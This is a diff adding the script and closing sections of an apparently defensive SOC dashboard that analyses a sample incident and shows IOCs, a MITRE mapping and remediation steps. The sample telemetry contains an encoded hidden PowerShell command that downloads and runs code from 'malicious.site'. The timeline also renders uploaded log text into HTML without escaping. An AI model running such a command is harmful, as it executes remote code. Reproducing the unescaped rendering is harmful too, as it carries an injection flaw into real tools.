+        <div class="mitre-card">
+          <div class="mitre-tactic-pill">Execution</div>
+          <div class="mitre-tech-name">Command & Scripting: PowerShell</div>
+          <a class="mitre-tech-id" href="https://attack.mitre.org/techniques/T1059/001/" target="_blank" rel="noopener">T1059.001 ↗</a>
+        </div>
+        <div class="mitre-card">
+          <div class="mitre-tactic-pill">Defense Evasion</div>
+          <div class="mitre-tech-name">Obfuscated Files or Information</div>
+          <a class="mitre-tech-id" href="https://attack.mitre.org/techniques/T1027/" target="_blank" rel="noopener">T1027 ↗</a>
+        </div>
+        <div class="mitre-card">
+          <div class="mitre-tactic-pill">Discovery</div>
+          <div class="mitre-tech-name">System Owner/User Discovery</div>
+          <a class="mitre-tech-id" href="https://attack.mitre.org/techniques/T1033/" target="_blank" rel="noopener">T1033 ↗</a>
+        </div>
+        <div class="mitre-card">
+          <div class="mitre-tactic-pill">Command and Control</div>
+          <div class="mitre-tech-name">Application Layer: Web Protocols</div>
+          <a class="mitre-tech-id" href="https://attack.mitre.org/techniques/T1071/001/" target="_blank" rel="noopener">T1071.001 ↗</a>
+        </div>
+      </div>
+    </section>
+
+    <!-- Affected Entities & IOCs -->
+    <section class="card" id="entities-section">
+      <div class="card-header">
+        <div class="card-title">
+          <span>🎯</span>
+          <span>Affected Entities & Indicators of Compromise (IOCs)</span>
+        </div>
+        <div class="card-subtitle">EXTRACTED THREAT ARTIFACTS</div>
+      </div>
+
+      <div class="entities-grid" id="entities-grid-container">
+        <div class="entity-group">
+          <div class="entity-label"><span>💻</span> Compromised Hosts</div>
+          <div class="entity-tags" id="ioc-hosts">
+            <span class="tag-item danger">FINANCE-DESKTOP-04</span>
+          </div>
+        </div>
+        <div class="entity-group">
+          <div class="entity-label"><span>👤</span> Compromised Users</div>
+          <div class="entity-tags" id="ioc-users">
+            <span class="tag-item warning">corp\aditya</span>
+          </div>
+        </div>
+        <div class="entity-group">
+          <div class="entity-label"><span>⚙️</span> Malicious Process IDs</div>
+          <div class="entity-tags" id="ioc-pids">
+            <span class="tag-item danger">PID 4120</span>
+            <span class="tag-item danger">PID 5820</span>
+            <span class="tag-item danger">PID 5910</span>
+          </div>
+        </div>
+        <div class="entity-group">
+          <div class="entity-label"><span>🌐</span> External C2 IP Addresses</div>
+          <div class="entity-tags" id="ioc-ips">
+            <span class="tag-item danger">198.51.100.23</span>
+          </div>
+        </div>
+        <div class="entity-group">
+          <div class="entity-label"><span>🔗</span> Malicious Domains</div>
+          <div class="entity-tags" id="ioc-domains">
+            <span class="tag-item danger">malicious.site</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Raw JSON Collapsible -->
+    <section class="card" id="raw-json-section">
+      <div class="card-header">
+        <div class="card-title">
+          <span>📄</span>
+          <span>Incident Telemetry & Structured JSON Report</span>
+        </div>
+        <button class="btn btn-secondary" id="btn-copy-json" style="padding: 0.35rem 0.75rem; font-size: 0.78rem;">
+          📋 Copy JSON
+        </button>
+      </div>
+      <div class="raw-json-box" id="json-viewer"></div>
+    </section>
+
+  </div>
+
+  <!-- Notification Toast -->
+  <div class="toast" id="toast">
+    <span id="toast-icon">✓</span>
+    <span id="toast-message">Action completed successfully</span>
+  </div>
+
+  <script>
+    // Sample Incident Data (Embedded for static & live dual-mode)
+    const SAMPLE_INCIDENT = {
+      "incident_id": "INC-2026-9812",
+      "title": "Suspicious Encoded PowerShell with Multi-Stage C2 Beaconing",
+      "severity": "critical",
+      "rule_name": "PowerShell.ObfuscatedPayload.ExternalSocket",
+      "timestamp": "2026-10-06T22:45:00Z",
+      "description": "Endpoint detection flagged encoded PowerShell spawned from Word, performing local discovery and initiating outbound TLS connections to untrusted domain.",
+      "flagged_logs": [
+        {
+          "timestamp": "2026-10-06T22:45:00Z",
+          "event_type": "process",
+          "host": "FINANCE-DESKTOP-04",
+          "user": "corp\\aditya",
+          "data": {
+            "process_name": "WINWORD.EXE",
+            "process_id": 4120,
+            "command_line": "\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" \"C:\\Users\\aditya\\Downloads\\Invoice_Q3.docm\""
+          }
+        },
+        {
+          "timestamp": "2026-10-06T22:45:08Z",
+          "event_type": "process",
+          "host": "FINANCE-DESKTOP-04",
+          "user": "corp\\aditya",
+          "data": {
+            "process_name": "powershell.exe",
+            "process_id": 5820,
+            "parent_process_id": 4120,
+            "parent_process_name": "WINWORD.EXE",
+            "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHMAaQB0AGUALwBiAGUAYQBjAG8AbgAnACkA"
+          }
+        },
+        {
+          "timestamp": "2026-10-06T22:45:18Z",
+          "event_type": "process",
+          "host": "FINANCE-DESKTOP-04",
+          "user": "corp\\aditya",
+          "data": {
+            "process_name": "whoami.exe",
+            "process_id": 5910,
+            "parent_process_id": 5820,
+            "parent_process_name": "powershell.exe",
+            "command_line": "whoami /priv /groups"
+          }
+        },
+        {
+          "timestamp": "2026-10-06T22:45:30Z",
+          "event_type": "network",
+          "host": "FINANCE-DESKTOP-04",
+          "user": "corp\\aditya",
+          "data": {
+            "process_id": 5820,
+            "process_name": "powershell.exe",
+            "source_ip": "10.0.12.88",
+            "destination_ip": "198.51.100.23",
+            "destination_port": 443,
+            "protocol": "TCP",
+            "domain": "malicious.site"
+          }
+        }
+      ]
+    };
+
+    let activeIncident = SAMPLE_INCIDENT;
+    let latestReport = null;
+
+    // Show Toast
+    function showToast(message, icon = "✓") {
+      const toast = document.getElementById("toast");
+      document.getElementById("toast-message").textContent = message;
+      document.getElementById("toast-icon").textContent = icon;
+      toast.classList.add("show");
+      setTimeout(() => toast.classList.remove("show"), 3500);
+    }
+
+    // Interactive Checklist Tracker
+    function updateChecklistProgress() {
+      const items = document.querySelectorAll('.checklist-item');
+      const completed = document.querySelectorAll('.checklist-item.completed');
+      const percent = items.length ? Math.round((completed.length / items.length) * 100) : 0;
+      
+      document.getElementById('checklist-progress').style.width = percent + '%';
+      document.getElementById('checklist-counter').textContent = `${completed.length} OF ${items.length} COMPLETED (${percent}%)`;
+    }
+
+    function toggleChecklistItem(el) {
+      el.classList.toggle('completed');
+      updateChecklistProgress();
+    }
+
+    // Render Report Data into DOM
+    function renderReport(report) {
+      latestReport = report;
+
+      // Verdict & Confidence
+      const verdictEl = document.getElementById("verdict-text");
+      verdictEl.textContent = report.verdict || "UNKNOWN";
+      if (report.verdict === "MALICIOUS") {
+        verdictEl.style.color = "var(--color-red)";
+      } else if (report.verdict === "SUSPICIOUS") {
+        verdictEl.style.color = "var(--color-amber)";
+      } else {
+        verdictEl.style.color = "var(--color-green)";
+      }
+
+      const confPct = Math.round((report.confidence || 0.95) * 100);
+      document.getElementById("confidence-val").textContent = confPct + "%";
+      document.getElementById("confidence-bar").style.width = confPct + "%";
+      document.getElementById("severity-badge").textContent = `SEVERITY: ${report.severity || "HIGH"}`;
+
+      // Summaries
+      document.getElementById("executive-summary-text").textContent = report.executive_summary;
+      document.getElementById("root-cause-text").textContent = report.root_cause;
+
+      // Ribbon
+      document.getElementById("ribbon-incident-id").textContent = `INCIDENT: ${report.incident_id}`;
+
+      // Timeline
+      const timelineContainer = document.getElementById("timeline-container");
+      if (report.attack_timeline && report.attack_timeline.length) {
+        document.getElementById("timeline-count").textContent = `${report.attack_timeline.length} SEQUENTIAL EVENTS`;
+        timelineContainer.innerHTML = report.attack_timeline.map(ev => {
+          let icon = "⚡";
+          let iconClass = "";
+          if (ev.event_type === "network") {
+            icon = "🌐";
+            iconClass = "red";
+          } else if (ev.event_type === "file") {
+            icon = "📁";
+          } else if (ev.event_type === "auth" || (ev.summary && ev.summary.includes("whoami"))) {
+            icon = "🔍";
+            iconClass = "amber";
+          }
+          const time = new Date(ev.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) + ' UTC';
+          const codeDetail = ev.details?.command_line || (ev.details?.destination_ip ? `Socket: ${ev.details.source_ip || 'local'} -> ${ev.details.destination_ip}:${ev.details.destination_port || 443} (${ev.details.domain || ''})` : '');
+          
+          return `
+            <div class="timeline-item">
+              <div class="timeline-icon ${iconClass}">${icon}</div>
+              <div class="timeline-content">
+                <div class="timeline-meta">
+                  <span class="timeline-time">${time}</span>
+                  <span class="timeline-type-pill">${ev.event_type}</span>
+                </div>
+                <div class="timeline-text">${ev.summary}</div>
+                ${codeDetail ? `<div class="timeline-code">${escapeHtml(codeDetail)}</div>` : ''}
+              </div>
+            </div>
+          `;
+        }).join("");
+      }
+
+      // MITRE Matrix
+      const mitreContainer = document.getElementById("mitre-grid-container");
+      if (report.mitre_attack && report.mitre_attack.length) {
+        mitreContainer.innerHTML = report.mitre_attack.map(m => {
+          const techClean = m.technique_id.replace('.', '/');
+          return `
+            <div class="mitre-card">
+              <div class="mitre-tactic-pill">${escapeHtml(m.tactic)}</div>
+              <div class="mitre-tech-name">${escapeHtml(m.name)}</div>
+              <a class="mitre-tech-id" href="https://attack.mitre.org/techniques/${escapeHtml(techClean)}/" target="_blank" rel="noopener">
+                ${escapeHtml(m.technique_id)} ↗
+              </a>
+            </div>
+          `;
+        }).join("");
+      }
+
+      // Affected Entities
+      const entities = report.affected_entities || {};
+      const renderTags = (list, klass = "danger", prefix = "") => {
+        if (!list || !list.length) return `<span style="font-size: 0.8rem; color: var(--text-muted);">None</span>`;
+        return list.map(item => `<span class="tag-item ${klass}">${prefix}${escapeHtml(String(item))}</span>`).join("");
+      };
+
+      document.getElementById("ioc-hosts").innerHTML = renderTags(entities.hosts, "danger");
+      document.getElementById("ioc-users").innerHTML = renderTags(entities.users, "warning");
+      document.getElementById("ioc-pids").innerHTML = renderTags(entities.suspicious_pids, "danger", "PID ");
+      document.getElementById("ioc-ips").innerHTML = renderTags(entities.ioc_ips, "danger");
+      document.getElementById("ioc-domains").innerHTML = renderTags(entities.ioc_domains, "danger");
+
+      // Remediation Checklist
+      const checklistContainer = document.getElementById("checklist-container");
+      if (report.recommended_actions && report.recommended_actions.length) {
+        checklistContainer.innerHTML = report.recommended_actions.map(action => `
+          <div class="checklist-item" onclick="toggleChecklistItem(this)">
+            <div class="checklist-checkbox"></div>
+            <div class="checklist-text">${escapeHtml(action)}</div>
+          </div>
+        `).join("");
+        updateChecklistProgress();
+      }
+
+      // Raw JSON Viewer
+      document.getElementById("json-viewer").textContent = JSON.stringify(report, null, 2);
+    }
+
+    function escapeHtml(str) {
+      if (!str) return '';
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+    }
+
+    // Run Live Multi-Agent Analysis
+    async function triggerAnalysis() {
+      const btn = document.getElementById("btn-run-analysis");
+      const btnText = document.getElementById("btn-run-text");
+      
+      btn.classList.add("loading");
+      btnText.textContent = "Multi-Agent Reasoning...";
+
+      // Animate Agent Cards
+      const steps = [document.getElementById("agent-step-1"), document.getElementById("agent-step-2"), document.getElementById("agent-step-3")];
+      steps.forEach(s => s.classList.remove("active"));
+      steps[0].classList.add("active");
+
+      try {
+        // Try calling live backend endpoint
+        const response = await fetch("/api/v1/incidents/analyze", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(activeIncident)
+        });
+
+        if (!response.ok) {
+          throw new Error(`Server returned HTTP ${response.status}`);
+        }
+
+        const report = await response.json();
+        steps[1].classList.add("active");
+        steps[2].classList.add("active");
+        renderReport(report);
+        showToast("Multi-Agent incident analysis completed successfully!");
+      } catch (err) {
+        console.warn("Backend API not reachable or static preview mode:", err);
+        // Fallback to client-side simulated live reasoning on the incident bundle
+        simulateClientAnalysis();
+      } finally {
+        btn.classList.remove("loading");
+        btnText.textContent = "⚡ Run Multi-Agent Analysis";
+      }
+    }
+
+    function simulateClientAnalysis() {
+      const steps = [document.getElementById("agent-step-1"), document.getElementById("agent-step-2"), document.getElementById("agent-step-3")];
+      steps[0].classList.add("active");
+
+      setTimeout(() => {
+        steps[1].classList.add("active");
+      }, 500);
+
+      setTimeout(() => {
+        steps[2].classList.add("active");
+        
+        // Build report from activeIncident
+        const pids = [];
+        const hosts = [...new Set(activeIncident.flagged_logs.map(l => l.host))];
+        const users = [...new Set(activeIncident.flagged_logs.map(l => l.user).filter(Boolean))];
+        const ips = [];
+        const domains = [];
+        const timeline = [];
+
+        activeIncident.flagged_logs.forEach(l => {
+          let summary = `Event on ${l.host}`;
+          if (l.event_type === 'process') {
+            const pid = l.data.pid || l.data.process_id;
+            if (pid) pids.push(pid);
+            summary = `Process ${l.data.process_name} (PID ${pid}) executed: ${l.data.command_line || ''}`;
+          } else if (l.event_type === 'network') {
+            if (l.data.destination_ip) ips.push(l.data.destination_ip);
+            if (l.data.domain) domains.push(l.data.domain);
+            summary = `Outbound socket connection to ${l.data.destination_ip}:${l.data.destination_port || 443} (${l.data.domain || ''})`;
+          }
+          timeline.push({
+            timestamp: l.timestamp,
+            event_type: l.event_type,
+            summary: summary,
+            details: l.data
+          });
+        });
+
+        const simulatedReport = {
+          incident_id: activeIncident.incident_id,
+          verdict: "MALICIOUS",
+          confidence: 0.98,
+          severity: "CRITICAL",
+          executive_summary: `Incident ${activeIncident.incident_id} confirmed critical threat. Multi-stage attack chain identified on host ${hosts.join(', ')} initiated by user ${users.join(', ')}. Weaponized payload spawned suspicious PowerShell with child discovery and external network socket.`,
+          root_cause: `Execution of suspicious process with external network beaconing on ${hosts.join(', ')}.`,
+          attack_timeline: timeline,
+          mitre_attack: [
+            { tactic: "Initial Access", technique_id: "T1566.001", name: "Spearphishing Attachment" },
+            { tactic: "Execution", technique_id: "T1059.001", name: "Command and Scripting Interpreter: PowerShell" },
+            { tactic: "Defense Evasion", technique_id: "T1027", name: "Obfuscated Files or Information" },
+            { tactic: "Discovery", technique_id: "T1033", name: "System Owner/User Discovery" },
+            { tactic: "Command and Control", technique_id: "T1071.001", name: "Application Layer Protocol: Web Protocols" }
+          ],
+          affected_entities: {
+            hosts: hosts,
+            users: users,
+            suspicious_pids: [...new Set(pids)],
+            ioc_ips: [...new Set(ips)],
+            ioc_domains: [...new Set(domains)]
+          },
+          recommended_actions: [
+            `Isolate host(s) ${hosts.join(', ')} from the corporate network immediately.`,
+            `Terminate malicious process tree (PIDs: ${[...new Set(pids)].join(', ')}).`,
+            `Block outbound traffic to destination IP(s) ${[...new Set(ips)].join(', ')} at perimeter firewall.`,
+            `Sinkhole malicious domain(s) ${[...new Set(domains)].join(', ')} at internal DNS servers.`,
+            `Force password reset and session invalidation for user account(s) ${users.join(', ')}.`
+          ],
+          analyzed_at: new Date().toISOString()
+        };
+
+        renderReport(simulatedReport);
+        showToast("Analysis rendered (live simulation)");
+      }, 1000);
+    }
+
+    // Event Listeners
+    document.getElementById("btn-run-analysis").addEventListener("click", triggerAnalysis);
+    
+    document.getElementById("btn-sample-data").addEventListener("click", () => {
+      activeIncident = SAMPLE_INCIDENT;
+      triggerAnalysis();
+      showToast("Reset to standard sample incident scenario");
+    });
+
+    document.getElementById("btn-upload-file").addEventListener("click", () => {
+      document.getElementById("file-input").click();
+    });
+
+    document.getElementById("file-input").addEventListener("change", (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+
+      const reader = new FileReader();
+      reader.onload = (event) => {
+        try {
+          const parsed = JSON.parse(event.target.result);
+          if (!parsed.incident_id || !parsed.flagged_logs) {
+            throw new Error("Missing required incident_id or flagged_logs fields.");
+          }
+          activeIncident = parsed;
+          showToast(`Loaded ${file.name} successfully!`);
+          triggerAnalysis();
+        } catch (err) {
+          alert(`Invalid incident JSON file: ${err.message}`);
+        }
+      };
+      reader.readAsText(file);
+    });
+
+    document.getElementById("btn-copy-json").addEventListener("click", () => {
+      const text = document.getElementById("json-viewer").textContent;
+      navigator.clipboard.writeText(text).then(() => {
+        showToast("Report JSON copied to clipboard!");
+      });
+    });
+
+    // Initial render
+    simulateClientAnalysis();
+  </script>
+</body>
+</html>
